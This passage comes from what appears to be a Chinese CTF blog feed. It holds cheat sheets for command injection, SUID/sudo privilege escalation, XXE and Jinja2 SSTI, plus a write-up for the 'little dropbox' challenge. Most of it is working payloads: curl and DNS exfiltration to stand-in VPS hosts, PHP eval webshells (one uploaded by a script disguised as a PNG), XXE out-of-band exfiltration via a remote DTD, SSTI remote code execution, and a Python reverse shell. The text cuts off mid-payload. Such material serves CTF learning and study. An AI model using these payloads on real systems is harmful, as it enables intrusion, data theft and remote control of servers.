        <content type="html"><![CDATA[<h1 id="命令执行">命令执行</h1><h2 id="常见命令执行命令">常见命令执行命令</h2><pre><code>systemexecpassthrushell_exec</code></pre><p>exec 和 shell_exec 无回显</p><ul><li><p>保存到文件</p><pre><code>  cmd=ls /|tee 1.txt  或 cmd=ls / &gt; 1.txt  访问 url/1.txt</code></pre></li><li><p>通过 curl 外带</p><pre><code>  curl vps-ip:port/ `ls / | base64`</code></pre></li><li><p>Dns 外带</p><p>通过 DNS 网站 ping 通时传输数据<br>国内的网站如 <a href="http://ceye.io/">CEYE</a> 和 <a href="https://dnslog.cn/">DNSlog</a></p><pre><code>  ping `cat /flag | base64` .abcdef.ceye.io  ping `cat /flag | base64` .xxxxxxx.dnshook.site</code></pre></li><li><p>直接写马<br>通过 echo 命令写 php 木马，蚁剑连接</p><pre><code>  echo '&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;' &gt; 1.php  不用单引号的话就得在$前加\</code></pre></li><li><p>过滤了&amp;,&lt;,&gt;,|导致不能反弹shell</p><pre><code>  curl vps-ip:port/?`php%20-r%20%22echo%20base64_encode(shell_exec(%27ls%20/%27));%22`</code></pre></li></ul><h2 id="个人收集常见指令">个人收集常见指令</h2><pre><code>查看目录：ls,dir移动目录：cd删除文件：rm &lt;文件名&gt;查看文件: cat等复制文件：cp &lt;文件名&gt; &lt;文件名&gt;重命名：mv &lt;文件名&gt; &lt;文件名&gt;</code></pre><h2 id="SUID-命令提权">SUID 命令提权</h2><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 几乎涵盖了所有可以提权的命令<br>寻找所有权限带 s 的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br><span class="line"></span><br><span class="line">-user 指定文件拥有者</span><br><span class="line">-perm 文件权限</span><br><span class="line">-<span class="built_in">exec</span> 执行系统命令</span><br><span class="line">/usr/bin/sudo -l 列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure><h3 id="sudo">sudo</h3><pre><code>如果sudo可用，可用sudo -l获取所有无需密码的命令使用时在前面加sudo如 sudo find /etc/passwd -exec cat /flag \</code></pre><h4 id="sudo1-8-3提权">sudo1.8.3提权</h4><p>利用 CVE-2021-3156-plus 进行提权。<br><a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">https://github.com/Rvn0xsy/CVE-2021-3156-plus</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./exploit <span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="find">find</h3><pre><code>find /etc/passwd -exec whoami \;find /etc/passwd -exec cat /flag \;</code></pre><h3 id="date-读取文件">date 读取文件</h3><pre><code>date -f/--file &lt;filename&gt;</code></pre><h3 id="awk">awk</h3><pre><code>awk 'BEGIN &#123;system(&quot;whoami&quot;)&#125;'</code></pre><h3 id="sed-读取文件">sed 读取文件</h3><pre><code>sed -n '1p' /flag</code></pre><h3 id="vim">vim</h3><pre><code>vim /etc/sudoers添加你的账户sudo bash</code></pre><h3 id="file-读取文件">file 读取文件</h3><pre><code>file -f /flag</code></pre><h3 id="env">env</h3><pre><code>env /bin/sh</code></pre><h3 id="sudoedit">sudoedit</h3><pre><code>update-alternatives --config editor 查看所有可用编辑器EDITOR=&quot;nano -- /flag&quot; sudoedit /etc/GAMELAB或者EDITOR='nano -- /etc/passwd' sudoedit -- /etc/GAMELAB将你ID的数字改成0:0，初始路径改为/root，ctrl+0保存,ctrl+x退出tail -1 /etc/passwd</code></pre><h2 id="linux-管道符">linux 管道符</h2><pre><code>; 前面执行完成后再执行后面的语句| 直接执行后面的执行语句|| 只有前面执行出错时才执行后面的执行语句&amp; 无论前面真假都执行后面的语句&amp;&amp; 只有前面为真才执行后面的语句换行符也可以%0a、%0d、\n</code></pre><h2 id="绕过">绕过</h2><h3 id="关键字过滤绕过">关键字过滤绕过</h3><pre><code>flag 被过滤cat /flagcat /fla\gcat /fla&quot;&quot;gcat /fla''gcat /fl??cat /f\*cat /[e-h][k-m][9-b][e-h]cat /fl$1agcat /fl$2agcat /fl$@ag/???/?at /flaga=g;cat /fla$a</code></pre><h3 id="cat-类似命令">cat 类似命令</h3><pre><code>more、less、head、tail、sort、tac、nl</code></pre><h3 id="空格绕过">空格绕过</h3><pre><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$1、$IFS$9、$&#123;IFS&#125;、$IFS</code></pre><h3 id="payload-经过-base64-绕过">payload 经过 base64 绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2F0IC9mbGFn|<span class="built_in">base64</span> -d|sh</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure><h1 id="重要文件">重要文件</h1><pre><code>/proc/self/environ/proc/1/environ/etc/hosts/etc/passwd/var/log/nginx/access.log/var/log/apache2/access.log/proc/self/fd/3/proc/self/cmdline/proc/self/mounts/flag/var/www/html/flag.php/var/www/html/flag.txt/var/www/html/flag</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/posts/e93ac459.html"/>
      <url>/posts/e93ac459.html</url>
      
        <content type="html"><![CDATA[<h1 id="XXE">XXE</h1><p>XXE （PHP 5.45 之后不解析实体）</p><pre><code>&lt;!DOCTYPE 根标签名 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>DTD 实体是用于定义引用文本或字符的快捷方式的变量，可内部声明或外部引用。</p><p>约束通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><pre><code>&lt;!ELEMENT 标签名 ANY&gt;</code></pre><p>同时 xxe 可进行内网探测读取 /etc/hosts</p><h1 id="Payload">Payload</h1><h2 id="PHP-文件读取">PHP 文件读取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="file-协议读取文件">file 协议读取文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="SVG-格式">SVG 格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h2 id="数据外带">数据外带</h2><p>攻击服务器创建 shell.dtd：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1:5555/?flag=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="xxe-绕过的-payload">xxe 绕过的 payload</h2><p>当只过滤了 SYSTEM，PUBLIC 等关键字时，可用双重实体编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;</span><br><span class="line"></span><br><span class="line">    %xml;</span><br></pre></td></tr></table></figure><p>即为在 xml 实体中再定义一次 xml，可成功被解析，支持 dtd 数据外带</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;core&gt;</span><br><span class="line">      &lt;message&gt;&amp;xxe;&lt;/message&gt;</span><br><span class="line">&lt;/core&gt;</span><br></pre></td></tr></table></figure><p>XXE 待复现<br>转自 <a href="https://wiki.wgpsec.org/knowledge/ctf/xxe.html">https://wiki.wgpsec.org/knowledge/ctf/xxe.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[奇安信]Web-4-littledropbox</title>
      <link href="/posts/89707270.html"/>
      <url>/posts/89707270.html</url>
      
        <content type="html"><![CDATA[<h1 id="little-dropbox">little dropbox</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>))) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]), <span class="string">&#x27;&lt;?&#x27;</span>) !== False) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$info</span>[<span class="number">0</span>] !== <span class="number">100</span> || <span class="variable">$info</span>[<span class="number">1</span>] !== <span class="number">50</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$uploadDir</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ready</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;ready&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ready</span> === <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>] = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[0]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">225</span>; <span class="variable">$i</span>++) <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[226]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[227]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[228]</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span> === (<span class="keyword">string</span>)<span class="variable">$_SESSION</span>[<span class="string">&#x27;secretKey&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_ invoke__">upload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解题思路">解题思路</h1><h2 id="构造伪随机数">构造伪随机数</h2><p>一开始需要构造 key 才能上传题目, 开始时考虑使用专门进行种子爆破的 php_mt_seed 工具<br>后来百度发现无需暴力破解就可以计算原始种子<br><a href="https://www.anquanke.com/post/id/196831">https://www.anquanke.com/post/id/196831</a><br>前提要求是给定间隔 227 个值的两个 mt_rand()输出结果，例如第 1 个和第 228 个 mt_rand()的输出结果<br>下载 mt_rand-reverse-master<br><a href="https://github.com/ambionics/mt_rand-reverse">https://github.com/ambionics/mt_rand-reverse</a><br>传参 127.0.0.1:100/upload.php?ready=1</p><pre><code>412630690&lt;br&gt;1046894031&lt;br&gt;1961239210&lt;br&gt;2006731948&lt;br&gt;Cookie:PHPSESSID=o065m8ssj0dakiv4iijtsp8sq6</code></pre><p>传第 0 个和第 227 个 mt_rand()值</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python reverse_mt_rand.py <span class="number">412630690</span> <span class="number">1961239210</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>得到 key 值 1955787332</p><h2 id="构造绕过-PHP-文件上传">构造绕过 PHP 文件上传</h2><p>使用文件名加点绕过<br>内容用 js 语言&lt;script language=“php”&gt;绕过<br>内容大小要求 100x50，使用 python 库 PIL 自动生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标上传的 URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/upload.php/?ready=1&amp;key=1955787332&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o065m8ssj0dakiv4iijtsp8sq6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造图片（100x50），并在图片数据中嵌入恶意 PHP 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image_with_payload</span>():</span><br><span class="line">    <span class="comment"># 创建一个 100x50 的空白图片</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">100</span>, <span class="number">50</span>), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    img_byte_arr = BytesIO()</span><br><span class="line">    img.save(img_byte_arr, <span class="built_in">format</span>=<span class="string">&quot;PNG&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PHP payload，嵌入到文件末尾</span></span><br><span class="line">    payload = <span class="string">b&quot;&lt;script language=\&quot;php\&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将图片数据和 payload 结合起来</span></span><br><span class="line">    img_data = img_byte_arr.getvalue() + payload</span><br><span class="line">    <span class="keyword">return</span> img_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造上传请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="comment"># 生成带有 payload 的图片</span></span><br><span class="line">    img_data = create_image_with_payload()</span><br><span class="line">    filename = <span class="string">&quot;shell.php.&quot;</span></span><br><span class="line">    <span class="comment"># 构造文件参数</span></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>: (filename, img_data, <span class="string">&quot;image/png&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 POST 请求，上传文件</span></span><br><span class="line">    response = requests.post(url, files=files, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出上传结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response status:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response body:&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload_file()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后访问 127.0.0.1:100/uploads/md5($_SERVER[‘REMOTE_ADDR’])/shell.php 用蚁剑连接，密码为 cmd。</p><h2 id="另一种方法：-htaccess-文件绕过对上传图片的尺寸限制">另一种方法：.htaccess 文件绕过对上传图片的尺寸限制</h2><p>我们可以使用 WEBP 格式绕过<br>WBMP 图像的开头可以使用 # 设置图像的尺寸大小，这正符合我们的要求。题目限制我们上传的图片尺寸必须为 100x50，那么我们在上传.htaccess 时便可以用 WBMP 来绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 100</span><br><span class="line">#define height 50</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>参考上文生成一个图片马，上传.htaccess 和 a.jpg, 上传 getshell</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种ssti绕过及脚本</title>
      <link href="/posts/301c82e9.html"/>
      <url>/posts/301c82e9.html</url>
      
        <content type="html"><![CDATA[<h1 id="判断网站类型">判断网站类型</h1><h2 id="自己查找判断">自己查找判断</h2><ul><li>在页面或者抓包回复里有时会泄露类型</li></ul><h2 id="7-‘7’"><strong>{{7*‘7’}}</strong></h2><ul><li>7777777 -&gt; Jinja2 //最常见的 ssti 类型</li><li>49 -&gt; Twig,smarty 或者其他</li><li>被过滤：试试{%print(7*‘7’)%}</li></ul><h1 id="各种类型">各种类型</h1><h2 id="Jinja2-python">Jinja2(python)</h2><h3 id="常规信息搜集">常规信息搜集</h3><ul><li><p>{{config}}<br>记录了很多基础信息，重要的有 SECRET_KEY，可以改 jwt 的 cookies 验证。</p></li><li><p>{{self.__dict__}}</p></li><li><p>{{url_for.__globals__}}</p></li><li><ul><li>{{url_for.__globals__[‘current_app’].config[‘FLAG’]}}</li></ul></li></ul><p>偶尔找找，flag 可以在这里</p><ul><li>{{datetime}}</li></ul><h3 id="含有-globals-的-python-内置类">含有__globals__的 python 内置类</h3><pre><code>{{a.__init__.__globals__}}这里的a类似undefine类。</code></pre><p>类似含有 globals 类的还有：</p><pre><code>{{self.__init__.__globals__}}{{cycler.__init__.__globals__}}{{cycler.next.__globals__}}{{application.__init__.__globals__}}{{namespace.__init__.__globals__}}{{joiner.__init__.__globals__}}{{g.pop.__globals__}}{{url_for.__globals__}}{{lipsum.__globals__}}{{get_flashed_massages.__globals__}}{{config.__class__.__init__.__globals__}}...</code></pre><h3 id="利用危险类-直接拿到了-globals-可略过">利用危险类(直接拿到了 globals 可略过)</h3><h4 id="利用-class-‘object’-进行注入">利用&lt;class ‘object’&gt;进行注入</h4><p>用这些可访问对象作为开头</p><pre><code>[]''&quot;&quot;()dictrequest</code></pre><p>并用 base，bases 或 mro 找到&lt;class ‘object’&gt;</p><pre><code>{{''.__class__.__base__}} // &lt;class 'object'&gt;{{''.__class__.__bases__[0]}} // &lt;class 'object'&gt;{{''.__class__.__mro__[1]}}// &lt;class 'object'&gt;</code></pre><p>使用 subclasses 找到危险类</p><pre><code>{{''.__class__.__bases__[0].__subclasses__()}}</code></pre><p>我们需要寻找危险类，再从中找到__globals__。<br>这里使用 os._wrap_close<br>跑脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[<span class="subst">&#123;i&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">    <span class="comment"># GET</span></span><br><span class="line">    res = requests.get(url=url + <span class="string">f&quot;?name=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    <span class="comment"># data = &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;flag&quot;: payload,</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># res = requests.post(url, data=data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># &#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[147]&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>拿到危险类后就可以随意构造了 (用 os._wrap_close 可以直接拿到 globals 中的 popen)</p><pre><code>{{''.__class__.__bases__[0].__subclasses__()[147].__init__.__globals__.__builtins__.eval(&quot;__import__('os').popen('whoami').read()&quot;)}}{{''.__class__.__bases__[0].__subclasses__()[147].__init__.__globals__.popen('whoami').read()}}</code></pre><h4 id="不使用-class-‘object’">不使用&lt;class ‘object’&gt;</h4><p><code>{{ request.__class__.__dict__ }}</code></p><ul><li>application</li><li>_load_form_data</li><li>on_json_loading_failed</li></ul><p><code>{{ config.__class__.__dict__}}</code></p><ul><li>__init__</li><li>from_envvar</li><li>from_pyfile</li><li>from_object</li><li>from_file</li><li>from_json</li><li>from_mapping</li><li>get_namespace</li><li>__repr__</li></ul><p>如果有回显出以下的全局对象</p><pre><code># Read file{{ request.__class__._load_form_data.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }}# RCE{{ config.__class__.from_envvar.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;ls&quot;).read() }}{{ config.__class__.from_envvar[&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read() }}{{ (config|attr(&quot;__class__&quot;)).from_envvar[&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;ls&quot;).read() }}{% with a = request[&quot;application&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]() %} {{ a }} {% endwith %}</code></pre><h3 id="POC-收集">POC 收集</h3><h4 id="回显">回显</h4><pre><code>read&amp;write1.使用FileLoader(_frozen_importlib_external.FileLoader)读取{{''.__class__.__bases__[0].__subclasses__()[122][&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)}}2.命令执行读取- open{{lipsum.__globals__['__builtins__'].eval(&quot;open('/etc/passwd').read()&quot;)}}- codecs{{lipsum.__globals__['__builtins__'].eval(&quot;__import__('codecs').open('/etc/passwd').read()&quot;)}}- pathlib{{lipsum.__globals__['__builtins__'].eval(&quot;__import__('pathlib').Path('/etc/passwd').read_text()&quot;)}}- io{{lipsum.__globals__['__builtins__'].eval(&quot;__import__('io').open('/etc/passwd').read()&quot;)}}RCE{{lipsum.__globals__.__builtins__.eval(&quot;__import__('os').popen('whoami').read()&quot;)}}{{lipsum.__globals__.os.popen(&quot;whoami&quot;).read()}}</code></pre><h4 id="无回显">无回显</h4><h5 id="容器有网">容器有网</h5><pre><code>使用curl命令带出数据{{config.__class__.__init__.__globals__['os'].popen('curl VPSIP/`ls /app/f*`').read()}}{{config.__class__.__init__.__globals__['os'].popen('curl VPSIP/`tac /app/fl4gfl4gfl4g`').read()}}反弹shell,把&quot;HOST_IP&quot;和Port换成自己的VPS地址{% for x in [].__class__.__base__.__subclasses__() %}    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}        {{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)')}}    {% endif %}{% endfor %}{{cycler.__init__.__globals__['__builtins__']['exec']('import 